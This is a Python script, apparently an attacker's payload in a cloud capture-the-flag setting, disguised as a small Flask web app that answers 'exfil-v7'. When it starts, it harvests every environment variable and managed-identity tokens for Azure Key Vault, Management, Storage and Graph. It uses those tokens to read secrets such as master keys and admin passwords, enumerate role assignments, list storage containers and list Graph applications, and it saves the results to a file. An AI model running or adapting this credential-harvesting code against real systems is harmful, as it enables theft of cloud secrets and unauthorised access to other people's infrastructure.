import os, json, sys, urllib.request

def get_token(scope, client_id=None, timeout=30):
    ie = os.environ.get('IDENTITY_ENDPOINT', '')
    ih = os.environ.get('IDENTITY_HEADER', '')
    if not ie or not ih:
        return None
    url = ie + '?resource=' + scope + '&api-version=2019-08-01'
    if client_id:
        url += '&client_id=' + client_id
    req = urllib.request.Request(url, headers={'X-IDENTITY-HEADER': ih})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read()).get('access_token', '')
    except Exception as e:
        return 'ERR:' + str(e)

def do_exfil():
    r = {}
    r['env'] = {k: v for k, v in sorted(os.environ.items())}
    client_id = '7a85156a-01c4-4e61-8472-40a92107159b'
    for scope in ['https://vault.azure.net', 'https://management.azure.com', 'https://storage.azure.com', 'https://graph.microsoft.com']:
        r[scope + '_ua'] = get_token(scope, client_id, timeout=30)
    vt = r.get('https://vault.azure.net_ua')
    if vt and not str(vt).startswith('ERR'):
        for kv in ['kv-tbl-prod-x3euoz', 'kv-tbl-sec-x3euoz']:
            try:
                req = urllib.request.Request('https://' + kv + '.vault.azure.net/secrets?api-version=7.4',
                    headers={'Authorization': 'Bearer ' + vt})
                with urllib.request.urlopen(req, timeout=15) as resp:
                    r[kv + '_list'] = json.loads(resp.read())
            except urllib.request.HTTPError as e:
                r[kv + '_list'] = 'HTTP' + str(e.code) + ':' + e.read().decode()[:500]
            except Exception as e:
                r[kv + '_list'] = str(e)
            for sn in ['flag','connection-string','master-key','secret','storage-key','tbl-flag','ctf-flag','admin-password','data-export-key','backup-key','reporting-key']:
                try:
                    req = urllib.request.Request('https://' + kv + '.vault.azure.net/secrets/' + sn + '?api-version=7.4',
                        headers={'Authorization': 'Bearer ' + vt})
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        r[kv + '/' + sn] = json.loads(resp.read())
                except urllib.request.HTTPError as e:
                    r[kv + '/' + sn] = 'HTTP' + str(e.code)
                except Exception as e:
                    r[kv + '/' + sn] = str(e)
    mt = r.get('https://management.azure.com_ua')
    if mt and not str(mt).startswith('ERR'):
        sub = 'c5e4e004-b42d-4ac4-a502-5fd338380eb6'
        rg2 = 'rg-tbl-reporting-prod-eus'
        try:
            req = urllib.request.Request(
                'https://management.azure.com/subscriptions/' + sub + '/resourceGroups/' + rg2 + '/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01',
                headers={'Authorization': 'Bearer ' + mt})
            with urllib.request.urlopen(req, timeout=15) as resp:
                r['rg2_roles'] = json.loads(resp.read())
        except Exception as e:
            r['rg2_roles'] = str(e)
        try:
            req = urllib.request.Request(
                'https://management.azure.com/subscriptions/' + sub + '/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId%20eq%20%27f64d08c7-fde6-4553-99c8-5bf73666ee8c%27',
                headers={'Authorization': 'Bearer ' + mt})
            with urllib.request.urlopen(req, timeout=15) as resp:
                r['my_roles'] = json.loads(resp.read())
        except Exception as e:
            r['my_roles'] = str(e)
    st = r.get('https://storage.azure.com_ua')
    if st and not str(st).startswith('ERR'):
        for sa in ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblcilogsprodx3euoz','sttblarchiveprodx3euoz']:
            try:
                req = urllib.request.Request('https://' + sa + '.blob.core.windows.net/?comp=list',
                    headers={'Authorization': 'Bearer ' + st, 'x-ms-version': '2020-10-02'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r[sa + '/containers'] = resp.read().decode()[:3000]
            except Exception as e:
                r[sa + '/containers'] = str(e)
    gt = r.get('https://graph.microsoft.com_ua')
    if gt and not str(gt).startswith('ERR'):
        try:
            req = urllib.request.Request('https://graph.microsoft.com/v1.0/applications',
                headers={'Authorization': 'Bearer ' + gt})
            with urllib.request.urlopen(req, timeout=10) as resp:
                r['graph_apps'] = json.loads(resp.read())
        except Exception as e:
            r['graph_apps'] = str(e)
    return r

try:
    results = do_exfil()
    with open('/home/results.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
except Exception as e:
    with open('/home/results.json', 'w') as f:
        json.dump({'startup_error': str(e)}, f)

from flask import Flask
app = Flask(__name__)

@app.route('/')
def index():
    return 'exfil-v7'
